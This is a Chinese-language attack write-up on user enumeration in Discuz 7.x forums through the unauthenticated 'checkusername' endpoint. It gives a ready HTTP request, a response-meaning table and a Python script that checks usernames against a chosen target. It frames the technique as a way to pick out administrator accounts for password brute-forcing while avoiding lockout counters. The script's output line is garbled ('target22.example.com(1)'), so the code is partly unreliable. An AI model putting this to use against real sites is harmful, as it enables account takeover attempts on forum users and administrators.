## 原理
Discuz 7.x 的注册表单带 `onBlur="checkusername()"`，前端调用 `example.com?action=checkusername` 做用户名查重。
该接口**不需要登录、不校验 Referer 以外权限、不消耗任何登录失败计数**，返回二值语义，可直接判定 `cdb_members` 里是否存在某用户名。

## 请求
```
GET /example.com?action=checkusername&username=<URL编码的用户名>&inajax=1 HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.26 Safari/537.36
Accept: */*
Referer: http://<target>/register.php
X-Requested-With: XMLHttpRequest
Connection: close
```

## 响应语义（Discuz 7.2 实测）
| 返回 CDATA | 含义 |
|---|---|
| `註冊` / `注册` | **该用户名可用 ⇒ 不存在** |
| `用戶名已經被他人使用` | **该用户名已被占用 ⇒ 存在** |
| `用戶名包含敏感字符` | 命中了用户名黑名单 |

原始响应形如：`<?xml version="1.0" encoding="utf-8"?><root><![CDATA[註冊]]></root>`

## 脚本
```python
import re, sys, urllib.parse as up, urllib.request
TARGET = sys.argv[1]; USER = sys.argv[2]
url = TARGET.rstrip("/") + "/example.com?action=checkusername&username=%s&inajax=1" % up.quote(USER)
h = {"User-Agent": "Mozilla/5.0", "Referer": TARGET.rstrip("/") + "/register.php",
     "X-Requested-With": "XMLHttpRequest", "Connection": "close"}
op = urllib.request.build_opener(urllib.request.ProxyHandler({}))   # 禁掉系统代理，避免假性失败
b = op.open(urllib.request.Request(url, headers=h), timeout=20).read().decode("utf-8", "ignore")
m = re.search(r"<!\[CDATA\[(.*?)\]\]>", b, re.S)
print(USER, "=>", target22.example.com(1) if m else b[:80])
```

## 利用价值
1. **把"盲爆用户名"变成"定点爆破"** —— 先枚举出确定存在的账号（尤其管理员/创始人），再针对它爆破口令，效率提升一个数量级。
2. **零成本情报**：不消耗登录失败配额、可在被封边缘反复使用。
3. 配合"从版面页/帖子页抓 uid→username 映射"可交叉验证接口可靠性（已知用户必须返回"已被使用"）。

## 注意事项
- 请先做**可靠性交叉验证**：拿 3–5 个从页面确认存在的用户名测试，全部应返回"已被使用"，否则接口不可信。
- 用户名字符集受 Discuz 规则限制（含下划线/数字后缀的中文名常被判"敏感字符"）。
- 仅返回"存在/不存在"，**不返回** email、uid、注册时间等敏感字段。